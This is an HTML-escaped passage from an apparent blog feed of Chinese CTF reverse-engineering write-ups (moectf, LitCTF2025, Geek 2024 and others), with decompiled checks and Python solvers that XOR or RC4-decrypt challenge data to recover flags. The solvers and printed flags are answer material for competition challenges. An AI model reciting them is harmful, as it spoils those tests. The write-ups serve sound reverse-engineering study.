class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">5</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">2</span>,   <span class="hljs-number">4</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">4</span>,   <span class="hljs-number">9</span>,   <span class="hljs-number">6</span>,   <span class="hljs-number">7</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">6</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">2</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">3</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">9</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">7</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">8</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">3</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">5</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">9</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">2</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">5</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">7</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">9</span>,<br>    <span class="hljs-number">7</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">4</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">8</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">9</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">4</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">6</span>]<br><span class="hljs-string">&#x27;&#x27;&#x27;for i in range(len(box)):</span><br><span class="hljs-string">print(box[i],end=&#x27;&#x27;)&#x27;&#x27;&#x27;</span><br>magic=[<span class="hljs-number">0x6B</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x4A</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x4A</span>,<span class="hljs-number">0x6D</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x6D</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x6F</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x5D</span>,<span class="hljs-number">0x4B</span>,<span class="hljs-number">0x1E</span>,<span class="hljs-number">0x19</span>,<span class="hljs-number">0x1C</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">0x4C</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>]<br>buf1=<span class="hljs-string">&#x27;825914367671358924349672581186429735952763148437185692268537419714296853593841276&#x27;</span><br>buf2=<span class="hljs-string">&#x27;005004360000050024049670000106020030900700108030005090200507009704000800090040006&#x27;</span><br>buf3=<span class="hljs-string">&#x27;8291767138932581849755263447186268341129653538127&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(buf1)):<br>    <span class="hljs-keyword">if</span> buf1[i] !=buf2[i]:<br>        <span class="hljs-built_in">print</span>(buf1[i],end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-comment">#print(len(buf),len(magic))</span><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(buf3)):<br>    flag=<span class="hljs-built_in">ord</span>(buf3[k])^magic[k]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(flag),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#flag=&#x27;moectf&#123;S0_As_I_prAy_Un1imited_B1ade_WOrks---E1m1ya_Shiro&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="FeatureExtraction-Litctf2025"><a href="#FeatureExtraction-Litctf2025" class="headerlink" title="FeatureExtraction-Litctf2025"></a><font style="color:rgb(48, 49, 51);">FeatureExtraction-</font><font style="color:rgb(77, 77, 77);">Litctf2025</font></h2><p><img src="/./img/fIkxkfKzg4ExsOqv/1748482301251-90b681db-daac-4b45-814c-503ac2502e4e-791380.png" alt="1748482301251-90b681db-daac-4b45-814c-503ac2502e4e.png"></p><p>题目提示要特征提取，可能是动调提取44位密文</p><p>看加密函数</p><p><img src="/./img/fIkxkfKzg4ExsOqv/1748483247730-c9cce732-284c-4fb2-877d-9034d3c357e9-941430.png" alt="1748483247730-c9cce732-284c-4fb2-877d-9034d3c357e9.png"></p><p>key</p><p><img src="/./img/fIkxkfKzg4ExsOqv/1748483413217-2b54e9b3-3c6f-487c-875a-43ca42128435-877580.png" alt="1748483413217-2b54e9b3-3c6f-487c-875a-43ca42128435.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1748483476083-756616be-7ab2-46da-b162-f364d63405a1-299103.png" alt="1748483476083-756616be-7ab2-46da-b162-f364d63405a1.png"></p><p>下完断点后提取数据</p><p><img src="/./img/fIkxkfKzg4ExsOqv/1748483683733-ed939bcf-8a63-4a84-8ec8-785bb78a7cfb-136628.png" alt="1748483683733-ed939bcf-8a63-4a84-8ec8-785bb78a7cfb.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1748483704369-9621be44-8c96-4237-97e9-4bb9978c539b-553916.png" alt="1748483704369-9621be44-8c96-4237-97e9-4bb9978c539b.png"></p><p>数据以dword形式提取出来</p><p><img src="/./img/fIkxkfKzg4ExsOqv/1748484162961-a707b2c0-1bf8-4c34-a53d-d705f1709245-701453.png" alt="1748484162961-a707b2c0-1bf8-4c34-a53d-d705f1709245.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">key = [<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;LitCTF2025&quot;</span>]<br><br>a = [<br>    <span class="hljs-number">5776</span>, <span class="hljs-number">15960</span>, <span class="hljs-number">28657</span>, <span class="hljs-number">34544</span>, <span class="hljs-number">40294</span>, <span class="hljs-number">43824</span>, <span class="hljs-number">51825</span>, <span class="hljs-number">53033</span>, <span class="hljs-number">58165</span>, <span class="hljs-number">58514</span>,<br>    <span class="hljs-number">61949</span>, <span class="hljs-number">56960</span>, <span class="hljs-number">53448</span>, <span class="hljs-number">49717</span>, <span class="hljs-number">47541</span>, <span class="hljs-number">45519</span>, <span class="hljs-number">40607</span>, <span class="hljs-number">40582</span>, <span class="hljs-number">38580</span>, <span class="hljs-number">42320</span>,<br>    <span class="hljs-number">41171</span>, <span class="hljs-number">41269</span>, <span class="hljs-number">39370</span>, <span class="hljs-number">44224</span>, <span class="hljs-number">48760</span>, <span class="hljs-number">49558</span>, <span class="hljs-number">48128</span>, <span class="hljs-number">46531</span>, <span class="hljs-number">47088</span>, <span class="hljs-number">46181</span>,<br>    <span class="hljs-number">46707</span>, <span class="hljs-number">46879</span>, <span class="hljs-number">48098</span>, <span class="hljs-number">52047</span>, <span class="hljs-number">53933</span>, <span class="hljs-number">56864</span>, <span class="hljs-number">60564</span>, <span class="hljs-number">64560</span>, <span class="hljs-number">66744</span>, <span class="hljs-number">63214</span>,<br>    <span class="hljs-number">60873</span>, <span class="hljs-number">58245</span>, <span class="hljs-number">55179</span>, <span class="hljs-number">56857</span>, <span class="hljs-number">51532</span>, <span class="hljs-number">44308</span>, <span class="hljs-number">32392</span>, <span class="hljs-number">27577</span>, <span class="hljs-number">19654</span>, <span class="hljs-number">14342</span>,<br>    <span class="hljs-number">11721</span>, <span class="hljs-number">9112</span>, <span class="hljs-number">6625</span><br>]<br><br>b = [<span class="hljs-number">0</span>] * <span class="hljs-number">44</span><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">44</span>):<br>    s = a[k]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">min</span>(<span class="hljs-number">10</span>, k + <span class="hljs-number">1</span>)):<br>        s -= b[k - j] * key[j]<br>    <span class="hljs-keyword">if</span> s % key[<span class="hljs-number">0</span>] != <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid division at k =&quot;</span>, k)<br>    b[k] = s // key[<span class="hljs-number">0</span>]<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> b:<br>    flag += <span class="hljs-built_in">chr</span>(x)<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="harre-鸿蒙逆向了解"><a href="#harre-鸿蒙逆向了解" class="headerlink" title="harre-鸿蒙逆向了解"></a>harre-鸿蒙逆向了解</h2><p><font style="color:rgb(0, 0, 0);">主要还是熟悉这个hap怎么逆向的</font></p><p><font style="color:rgb(0, 0, 0);">进去后直接就看到一个base64变表加密</font></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1747036391551-833e913b-1e3a-4554-afd8-edaadb09221e-473015.png" alt="1747036391551-833e913b-1e3a-4554-afd8-edaadb09221e.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1747036402437-f6099d0d-c0b1-4744-9b67-e4a8c0bc4891-687605.png" alt="1747036402437-f6099d0d-c0b1-4744-9b67-e4a8c0bc4891.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1747036261199-f5e1e789-eb78-4835-be0f-3a1b09eae051-087656.png" alt="1747036261199-f5e1e789-eb78-4835-be0f-3a1b09eae051.png"></p><h2 id="Android-Cracker-MOECTF"><a href="#Android-Cracker-MOECTF" class="headerlink" title="Android Cracker-MOECTF"></a>Android Cracker-MOECTF</h2><p>看一下然后放到模拟器里试试</p><p>好像直接看到flag了</p><p><img src="/./img/fIkxkfKzg4ExsOqv/1748484698529-102b5c77-6008-4767-ac3f-c60b878963f5-141032.png" alt="1748484698529-102b5c77-6008-4767-ac3f-c60b878963f5.png"></p><h2 id="ART-MOECTF"><a href="#ART-MOECTF" class="headerlink" title="ART-MOECTF"></a>ART-MOECTF</h2><p>看一下特征码没修改，那就直接脱壳逆</p><p><img src="/./img/fIkxkfKzg4ExsOqv/1748485056264-ed916702-effa-4f38-9a7b-453fb0c73097-304274.png" alt="1748485056264-ed916702-effa-4f38-9a7b-453fb0c73097.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1748485177854-2fa17bb7-42f4-486e-80e2-43de661d4ddc-404699.png" alt="1748485177854-2fa17bb7-42f4-486e-80e2-43de661d4ddc.png"></p><p><img src="/./img/fIkxkfKzg4ExsOqv/1748485231288-063e1c07-4d9c-4d97-abf7-c7af98211ad9-334288.png" alt="1748485231288-063e1c07-4d9c-4d97-abf7-c7af98211ad9.png"></p><p>dfs，不然是多解乱码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">tmp=[<span class="hljs-number">0</span>]*<span class="hljs-number">27</span>+[<span class="hljs-number">125</span>]<br>enc=[<span class="hljs-number">2</span>,  <span class="hljs-number">24</span>,  <span class="hljs-number">15</span>, <span class="hljs-number">248</span>,  <span class="hljs-number">25</span>,   <span class="hljs-number">4</span>,  <span class="hljs-number">39</span>, <span class="hljs-number">216</span>, <span class="hljs-number">235</span>,   <span class="hljs-number">0</span>,<br>   <span class="hljs-number">53</span>,  <span class="hljs-number">72</span>,  <span class="hljs-number">77</span>,  <span class="hljs-number">42</span>,  <span class="hljs-number">69</span>, <span class="hljs-number">107</span>,  <span class="hljs-number">89</span>,  <span class="hljs-number">46</span>,  <span class="hljs-number">67</span>,   <span class="hljs-number">1</span>,<br>   <span class="hljs-number">24</span>,  <span class="hljs-number">92</span>,<span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">181</span>, <span class="hljs-number">125</span>]<br><span class="hljs-comment">#Str1[i - 1] ^= (Str1[i - 1] % 17 + Str1[i]) ^ 25</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dfs</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">if</span> index ==<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> tmp:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-built_in">print</span>()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">255</span>):<br>            <span class="hljs-keyword">if</span> (i^<span class="hljs-number">25</span>)^(i%<span class="hljs-number">17</span>+tmp[index])==enc[index-<span class="hljs-number">1</span>]:<br>                tmp[index-<span class="hljs-number">1</span>]=i<br>                dfs(index-<span class="hljs-number">1</span>)<br>dfs(<span class="hljs-number">27</span>)<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2025-06-04 14:39:27<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/dc9gz10hoac0q8rq">https://www.yuque.com/chaye-apqbl/vsc85q/dc9gz10hoac0q8rq</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2025/%E9%80%86%E5%90%91%E5%8D%81%E9%81%93%E9%A2%98/"/>
    <url>/2026/01/19/WP/2025/%E9%80%86%E5%90%91%E5%8D%81%E9%81%93%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="逆向十道题"><a href="#逆向十道题" class="headerlink" title="逆向十道题"></a>逆向十道题</h1><h2 id="ipa-2025校赛"><a href="#ipa-2025校赛" class="headerlink" title="ipa-2025校赛"></a>ipa-2025校赛</h2><p>后缀改成zip然后解压</p><p>将exec文件拖入ida反编译</p><p><img src="/./img/0y4nWCBig3HdPZMW/1747206676676-b1a270f2-a557-4686-a42f-2db66f880c12-068355.png" alt="1747206676676-b1a270f2-a557-4686-a42f-2db66f880c12.png"></p><p>加载的时候没看到最上面的函数（所以说不能只盯着main函数看）</p><p><img src="/./img/0y4nWCBig3HdPZMW/1747206965205-337d5f3e-4a3e-4c64-ad0e-520ead96d7e1-417172.png" alt="1747206965205-337d5f3e-4a3e-4c64-ad0e-520ead96d7e1.png"></p><p>数据在src里面</p><p><img src="/./img/0y4nWCBig3HdPZMW/1747207108017-1a3f6a32-9be5-438c-a7e2-8db30fa5da67-673284.png" alt="1747207108017-1a3f6a32-9be5-438c-a7e2-8db30fa5da67.png"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">a=&#x27;Ios&#x27;<br>miwen=[0x2F,0x3,0x12,0x2E,0x14,0x21,0x2C,0x19,0x16,0x3B,0x1C,0x16,0x16,0x9,0x43,0x3B,0x30,0x3A,0x79,0x1C,0x2C,0x78,0x1C,0x2C,0x0,0x1,0x7,0x2C,0x1D,0x16,0x3A,0x3B,0x1A,0x27,0x8,0xE]<br><span class="hljs-section">#print(len(miwen))</span><br>for i in range(len(miwen)):<br><span class="hljs-code">    b=miwen[i]^ord(a[i%3])</span><br><span class="hljs-code">    print(chr(b),end=&#x27;&#x27;)</span><br></code></pre></td></tr></table></figure><p><img src="/./img/0y4nWCBig3HdPZMW/1747207305281-7bb2bab9-cc9b-4ca4-900b-35138d365388-464840.png" alt="1747207305281-7bb2bab9-cc9b-4ca4-900b-35138d365388.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1747036587351-5ade56f1-b762-4ac8-abee-6d5cb7b60f51-995619.png" alt="1747036587351-5ade56f1-b762-4ac8-abee-6d5cb7b60f51.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs plain">int __fastcall main(int argc, const char **argv, const char **envp)<br>&#123;<br>  unsigned int seed; // eax<br>  char s[96]; // [rsp+10h] [rbp-70h] BYREF<br>  int v6; // [rsp+70h] [rbp-10h]<br>  int i_1; // [rsp+78h] [rbp-8h]<br>  int i; // [rsp+7Ch] [rbp-4h]<br><br>  memset(s, 0, sizeof(s));<br>  v6 = 0;<br>  printf(&quot;input:&quot;);<br>  __isoc99_scanf(&quot;%s&quot;, s);<br>  if ( strlen(s) == 20 )<br>  &#123;<br>    seed = time(0LL);<br>    srand(seed);<br>    i_1 = rand() % 100;<br>    for ( i = 0; i &lt; i_1; ++i )<br>      ;<br>    if ( *(unsigned __int16 *)s * *(unsigned __int16 *)&amp;s[2] == 342772773<br>      &amp;&amp; *(unsigned __int16 *)s + *(unsigned __int16 *)&amp;s[2] == 39526<br>      &amp;&amp; *(_DWORD *)&amp;s[4] - *(_DWORD *)&amp;s[8] == 1005712381<br>      &amp;&amp; *(unsigned __int16 *)&amp;s[4] + *(unsigned __int16 *)&amp;s[6] == 56269<br>      &amp;&amp; *(unsigned __int16 *)&amp;s[8] - *(unsigned __int16 *)&amp;s[10] == 15092<br>      &amp;&amp; s[4] * s[8] == 10710<br>      &amp;&amp; s[6] * s[10] == 12051<br>      &amp;&amp; s[7] + s[11] == 172<br>      &amp;&amp; *(unsigned __int16 *)&amp;s[12] * *(unsigned __int16 *)&amp;s[14] == 171593250<br>      &amp;&amp; *(unsigned __int16 *)&amp;s[12] + *(unsigned __int16 *)&amp;s[14] == 26219<br>      &amp;&amp; *(unsigned __int16 *)&amp;s[16] * *(unsigned __int16 *)&amp;s[18] == 376306868<br>      &amp;&amp; *(unsigned __int16 *)&amp;s[16] + *(unsigned __int16 *)&amp;s[18] == 40341 )<br>    &#123;<br>      puts(&quot;check ok~!&quot;);<br>    &#125;<br>    else<br>    &#123;<br>      puts(&quot;check failed~!&quot;);<br>    &#125;<br>  &#125;<br>  return 1;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="harre-鸿蒙逆向了解-2025校赛"><a href="#harre-鸿蒙逆向了解-2025校赛" class="headerlink" title="harre-鸿蒙逆向了解-2025校赛"></a>harre-鸿蒙逆向了解-2025校赛</h2><p><font style="color:rgb(0, 0, 0);">主要还是熟悉这个hap怎么逆向的</font></p><p><font style="color:rgb(0, 0, 0);">进去后直接就看到一个base64变表加密</font></p><p><img src="/./img/0y4nWCBig3HdPZMW/1747036391551-833e913b-1e3a-4554-afd8-edaadb09221e-030896.png" alt="1747036391551-833e913b-1e3a-4554-afd8-edaadb09221e.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1747036402437-f6099d0d-c0b1-4744-9b67-e4a8c0bc4891-513813.png" alt="1747036402437-f6099d0d-c0b1-4744-9b67-e4a8c0bc4891.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1747036261199-f5e1e789-eb78-4835-be0f-3a1b09eae051-319029.png" alt="1747036261199-f5e1e789-eb78-4835-be0f-3a1b09eae051.png"></p><h2 id="让我康康你的调试-极客2024"><a href="#让我康康你的调试-极客2024" class="headerlink" title="让我康康你的调试-极客2024"></a>让我康康你的调试-极客2024</h2><p><img src="/./img/0y4nWCBig3HdPZMW/1731737832708-3fd0eab8-76e5-4de8-acf1-a29d5329b6f0-157244.png" alt="1731737832708-3fd0eab8-76e5-4de8-acf1-a29d5329b6f0.png"></p><p>不理解这个v7的作用是什么</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plain">from Crypto.Cipher import ARC4<br>import binascii<br><br># 十六进制字符串<br>hex_data = &quot;945b7d04c9027aa6390798bc0d68f97e08bdbf9816f804715f1586b69884db61&quot;<br><br># 将十六进制字符串转换为字节<br>ciphertext = binascii.unhexlify(hex_data)<br><br># RC4 密钥（假设你知道密钥）<br>key = b&#x27;syclover&#x27;  # 替换为你的RC4密钥<br><br># 创建 RC4 解密对象<br>cipher = ARC4.new(key)<br><br># 解密数据<br>plaintext = cipher.decrypt(ciphertext)<br><br># 输出解密后的内容<br>print(plaintext.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;))<br>for i in range(len(plaintext)):<br>    flag=plaintext[i]^0x14<br>    print(chr(flag),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><h2 id="也许你也听jay-极客2024"><a href="#也许你也听jay-极客2024" class="headerlink" title="也许你也听jay-极客2024"></a>也许你也听jay-极客2024</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>   <br>    <span class="hljs-type">char</span> URL[<span class="hljs-number">46</span>];<br>    <span class="hljs-type">char</span> o00O0OO000OO0oooo0o0oo0O0oo000000O0O0OO0O0O00OO0OO0O[<span class="hljs-number">46</span>];<br>    <span class="hljs-built_in">strcpy</span>(o00O0OO000OO0oooo0o0oo0O0oo000000O0O0OO0O0O00OO0OO0O, URL);<br>    <span class="hljs-type">char</span> o00O0OO000OO0oooo0o0oo0O0oo000000O0O0OO0O00000O0OO0O[] = &#123;<span class="hljs-number">0x96</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xd4</span>&#125;;<br>    <span class="hljs-type">int</span>  o00O0OO000OO0oooo0o0oo0O0000oooooooO0O0OO0O0O00OO0OO0O[] = &#123;<span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x24</span>, <span 